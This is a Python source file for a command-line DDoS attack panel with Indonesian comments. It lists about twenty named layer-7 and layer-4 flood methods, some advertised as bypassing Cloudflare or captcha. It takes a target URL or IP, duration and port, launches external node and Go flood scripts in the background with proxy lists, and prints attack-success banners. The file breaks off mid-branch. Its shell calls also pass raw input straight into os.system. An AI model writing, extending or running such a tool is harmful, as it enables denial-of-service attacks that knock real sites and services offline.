# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
from datetime import datetime

def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b %d %Y %H:%M:%S")


B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

def ongoing():
        print("""\033[37m
No attacks are executed. try to go home and try an attack(help)
""")

def layer7():
	print("""\033[37m
ðððððð¿ [GET/POST]       ððððð¼ð¿ [9-150-300]  ð¥ð£ð¦ [5]
ððð    [5-8]            ðð¨ð¥ðð§ðð¢ð¡ [250]
ð¾ðð    [100-500]        ð£ð¢ð¥ð§ [80-443]

â¢ BOMB [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mMETHOD\033[37m]
â¢ BOMB2 [\033[36mURL\033[37m] [\033[36mGET\033[37m]
â¢ BROWSER [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ TLSV2 [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ ZEUS [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ ARA [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ HTTPS [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ TLS [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ UAM [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ HTTPS2 [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mRPS\033[37m] [\033[36mTHREAD\033[37m]
â¢ MIX [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mRPS\033[37m] [\033[36mTHREAD\033[37m]
â¢ HENTAI [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ BYPASS [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ WORM [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ STRIKE [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ HTTPSRIZ [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ TLSZLOCRY [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mRPS\033[37m]
â¢ KILLNET [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ TLSHOLD [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
â¢ VIOLET [\033[36mURL\033[37m] [\033[36mTIME\033[37m] [\033[36mPORT\033[37m]
""")

def layer4():
	print("""\033[37m
ð£ð¢ð¥ð§ [80-443]
ð§ðð ð [250]

â¢ TCP [\033[36mIP\033[37m] [\033[36mPORT\033[37m] [\033[36mTIME\033[37m]
""")

def help():
	print("""\033[37m
     			      	  Methods
 NAMEÂ Â     â DESCRIPTION Â                  	          â DURATION
ââââââââââââ¼âââââââââââââââââââââââââââââââââââââââââââââââ¼ââââââââââ
BOMBÂ Â Â     â layer 7Â - Attack url                     	  â 250
BOMB2	   â layer 7 - Attack url		      	  â 250
BROWSER    â layer 7 - Attack url 		       	  â 250
TLSV2      â layer 7 - Attack url		     	  â 250
ZEUS       â layer 7 - Attack url			  â 250
ARA        â layer 7 - Attack url MAINTENANCE, [Serv 1]   â 250
HTTPS	   â layer 7 - Attack url		     	  â 250
TLS        â layer 7 - [SPECIAL] Attack url          	  â 250
UAM	   â layer 7 - Attack url [Serv 1]		  â 250
HTTPS2     â layer 7 - Attack url	              	  â 250
MIX	   â layer 7 - Attack url CloudFlare, Chaptcha	  â 250
HENTAI     â layer 7 - Attack url	    	     	  â 250
BYPASS     â layer 7 - Attack url	   	     	  â 250
WORM       â layer 7 - [WARNING] use vps, Attack url 	  â 50
STRIKE     â layer 7 - Attack url	   	     	  â 250
HTTPS-RIZ  â layer 7 - Attack url [admin only]	     	  â 120
TLS-ZLOCRY â layer 7 - [SPECIAL] Attack url	     	  â 250
KILLNET    â layer 7 - Attack url		     	  â 250
TLS-HOLD   â layer 7 - [VIP] Attack url		     	  â 250
VIOLET     â layer 7 - Attack url		     	  â 250
TCP        â layer 4 - [VIP] Attack IP	             	  â 120
UDP        â layer 4 - on processing                 	  â 120
""")

def menu():
    os.system ("clear")
    print("""\033[36m
\033[36mâ â â â â â â â£¿â£¶â£¶â£¶â£¤â£¤â£â£â¡â â â â â â â â â â â â â â â â â â â â 
\033[36mâ â â â â â â â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£¶â£¦â£¤â£¤â£â£â¡â â â â â â â â â â â 
\033[36mâ â â â â â â â£¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£¶â£¤â£â â â â â â 
\033[36mâ â£ â£¤â£´â£¶â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¦â¡â â â 
\033[36mâ »â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡â â 
\033[36mâ â â â â â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â â¢¿â£¿â£¿â£¿â£¿â£¿\033[35mâ â ððððððð ðð ððððð ð ðððð ð ððð
\033[36mâ â â â â â¢â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡â â â »â ¿â â â â£¿â£¿â£¿â£¿â£¿â¡\033[35mâ   & ððððððððð.\033[32m ððð«ð¬ð¢ð¨ð§ ð.ð
\033[36mâ â â â â¢â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â£¿â¡¿â â â â â â â â â¢»â£¿â£¿â£¿â£¿â¡â 
\033[36mâ â â â¢ â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â â¢¿â¡â â â â â â â â â â¡â¢¿â£¿â£¿â£·\033[37m â   USER : --------
\033[36mâ â â£ â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â â â §â¢â£â¡â â â â¡ â â â â¢¸â£¿â£¿â£¿\033[37mâ â   PASS : *********
\033[36mâ â â â â¢â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡â »â£¿â£¿â£·â â â â â â â¢¿â£¿â£¿â¢¿â£¿â£¿â£¿â¡\033[37mâ   TIMELIMIT : 300
\033[36mâ â â â â£¼â£¿â£¿â£¿â£¿â â¢»â£¿â£¿â£¿â£¿â£¿â£¿â¡â â â â â â â â â â â â â â â£¿â£¿â¢¿â£\033[37mâ   VIP : true
\033[36mâ â â â â£¿â£¿â£¿â£¿â£¿â¡â â£¿â£¿â£¿â£¿â£¿â£¿â â â â â â â â â â â â â â â¢°â£¿â£¿â â \033[37mâ   ADMIN : true
\033[36mâ â â â â â â â¢¸â£¿â£¿â£¶â£¿â£¿â£¿â£¿â£¿â£¿â â â â â â â â â â â â â â â£¸â£¿â£¿\033[37mâ â â   API : true
\033[36mâ â â â â â â â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â â â â  â â£â£â£â£â  â â£ â£¿â£¿â£¿\033[37mâ â â   ORG : IDN
\033[36mâ â â â â â â â ¸â£¿â â â¢»â£¿â£¿â£¿â£¿â£¿â£â£â£â¡â â â   â£â£¶â ¶â¢¾â£¿â£¿â£¿â£¿â â 
\033[36mâ â â â â â â â â â â â â£¿â£¿â¢¿â£¿â£¿â¡â â â â¡¹â â â »â£¿â¡â â â â â¢¿â£¿â£¿â â 
\033[36mâ â â â â â â â â â â â¢â£¿â£â  â ½â ¿â¢§â£â£â£°â£¡â â â â â¡â â â â â â â ¿â â 
\033[36mâ â â â â â â â â â â â£¼â¡â â â â â¢¸â£¿â¡¿â â â â â â¢°â¡â â â â â â â â â 
\033[36mâ â â â â â â â â â â â£¿â£â â â â â¢¸â â â â â â â¢ â£¿â¡â â â â â â â â  â [ð­.ð¦ð/ð©ð¨ð°ðð«ð©ð«ð¨ð¨ðð]
\033[36mâ â â â â â â â â â â â£¸â£¿â£§â£â â â¢¸â â â â¢â£ â¡´â â â£¹â â â â â   ð´ðð¾ðð ð ð³ð³ð¾ð ð ð±ð¸ð» ð²ð¸ ð°ð¿ð¸â â â â 
\033[36mâ â â â â â â â â£ â â£â¢¿â£¿â¡¿â ¿â ¿â£¶â£¿â ¯â ­â ­â ­â â â â¢»â â â â â â 
\033[36mâ â â â â â â â â¡â¢¸â  â£³â£¿â¡â¡â¢±â â »â£¿â ¿â ¿â ¿â ¿â â â »â¢·â â â â â 
\033[36mâ â â â â â â â â ¹â£¤â â£¸â â¡â¡â â â£°â â »â£¦â¡â â â â â â¡
\033[35mâââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
\x1b[1;37m\x1b[1;37mplease type '\033[34mMethods\033[37m' to see all methods
""")



def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] ERORRXDDOSXBIL :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
		sin = input("\033[0;44;44mERORR X DDOS X BIL\x1b[1;40m\033[0m ðª \033[0;44;44mnothing\x1b[1;40m\033[0m â¤ \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls" or sinput == "CLS":
			os.system ("pkill screen")
			os.system ("clear")
			menu()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			menu()			
		if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
			layer7()
		if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
			layer4()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "methods" or sinput == ".methods" or sinput == "METHODS" or sinput == ".METHODS":
			help()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########LAYER-4 - 7########
		elif sinput == "killnet" or sinput == "KILLNET":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node black-eye.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m killnet\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'screen -dm node TCP {method} {ip} {port} {time} 15000')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   IP:          \033[31m[ \033[36m{ip} \033[31m]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m tcp\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "ara" or sinput == "ARA":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node httpsv2 {url} {time} {port} 10 bypass')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:    	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:  	\033[31m[\033[36m ara\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()

#########LAYER-7########  
		elif sinput == "httpsriz" or sinput == "HTTPSRIZ" or sinput == "https-riz" or sinput == "HTTPS-RIZ":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node https-riz.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m https-riz\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https2" or sinput == "HTTPS2":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node HTTPS2.js {url} {time} 5 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m https2\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "mix" or sinput == "MIX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				rps = sin.split()[3]
				threads = sin.split()[4]
				os.system(f'screen -dm node MIXMAX.js {url} {time} {rps} {threads}')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   RPS:         \033[31m[\033[36m {rps}\033[31m ]
\033[1;37m   THREADS:	\033[31m[\033[36m {threads}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m mix\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlszlocry" or sinput == "TLSZLOCRY" or sinput == "tls-zlocry" or sinput == "TLS-ZLOCRY":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				rps = sin.split()[3]
				os.system(f'screen -dm node anus.js {url} {time} {rps} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   RPS:         \033[31m[\033[36m {rps}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m tls-zlocry\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bypass" or sinput == "BYPASS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node BYPASS-ERORR.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m bypass\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "browser" or sinput == "BROWSER":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node BROWSER.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[ \033[36m{port}\033[31m ]
\033[1;37m   METHOD: 	\033[31m[\033[36m browser\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mERORR37\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls" or sinput == "TLS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node TLS-SUS.js {url} {time} {port} 10')
				os.system(f'screen -dm node tls-sucuri.js {url} {time} {port} 10')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m tls\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb" or sinput == "BOMB":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				method = sin.split()[3]
				os.system(f'screen -dm go run Coli.go -site {url} -data {method}')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m {method}\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "hentai" or sinput == "HENTAI":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node HENTAI.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST: 	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m hentai\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "worm" or sinput == "WORM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node worm.js {url} {time} {port} 12 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m worm\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "strike" or sinput == "STRIKE":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node STRIKE.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m strike\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlshold" or sinput == "TLSHOLD" or sinput == "tls-hold" or sinput == "TLS-HOLD":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node TLS-HOLD.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m tls-hold\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "violet" or sinput == "VIOLET":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node VIOLET.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST: 	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:  	\033[31m[\033[36m violet\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "bomb2" or sinput == "BOMB2":
			try:
				url = sin.split()[1]
				method = sin.split()[2]
